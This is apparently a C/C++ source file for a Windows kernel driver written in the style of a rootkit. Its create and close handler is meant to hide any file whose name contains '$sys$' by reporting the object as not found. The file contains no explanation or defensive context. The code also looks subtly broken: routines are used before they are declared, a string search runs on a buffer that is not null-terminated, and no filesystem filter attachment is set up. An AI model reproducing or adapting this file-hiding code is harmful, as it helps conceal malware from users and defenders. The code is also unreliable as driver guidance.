#include <ntddk.h>

#define TARGET_STRING L"$sys$"

extern "C" NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT   DriverObject,
    _In_ PUNICODE_STRING  RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = UnloadDriver;

    DriverObject->MajorFunction[IRP_MJ_CREATE] = IRPCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = IRPCreateClose;

    return STATUS_SUCCESS;
}

extern "C" VOID UnloadDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    KdPrint(("Driver Unloaded\n"));
}

extern "C" NTSTATUS IRPCreateClose(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);

    if (irpStack->FileObject->FileName.Length > 0)
    {
        if (wcsstr(irpStack->FileObject->FileName.Buffer, TARGET_STRING) != NULL)
        {
            // If the file name contains the specified string, modify the Status to STATUS_OBJECT_NAME_NOT_FOUND
            Irp->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
